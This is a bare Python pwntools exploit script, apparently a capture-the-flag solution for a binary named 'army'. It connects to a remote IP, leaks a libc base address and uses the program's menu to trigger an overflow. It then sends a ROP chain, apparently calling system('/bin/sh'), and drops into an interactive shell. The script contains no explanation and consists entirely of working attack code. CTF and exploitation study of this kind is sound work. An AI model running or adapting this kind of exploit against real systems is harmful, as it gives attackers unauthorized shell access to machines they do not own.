from pwn import *

#r = process(["./army"])
r = remote("185.168.131.122", 6000)
r.recvuntil(": ")
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690
print hex(libc)
r.sendlineafter("3.","1")
r.sendlineafter(":","Billy")
r.sendlineafter(":","100")
r.sendlineafter(":","100")
r.sendlineafter(":",str(0x70))
r.sendlineafter(":","Billy")
r.sendlineafter("3.","3")
#input(":")
r.sendafter(":","a"*0x70)

r.sendlineafter("3.","1")
r.sendlineafter(":","Billy")
r.sendlineafter(":","100")
r.sendlineafter(":","100")
r.sendlineafter(":","-1")

r.sendlineafter("3.","3")
#input(":")

r.sendafter(":","a"*0x38+p64(0x0400d03)+p64(libc+0x18cd57)+p64(libc+0x45390))
r.interactive()
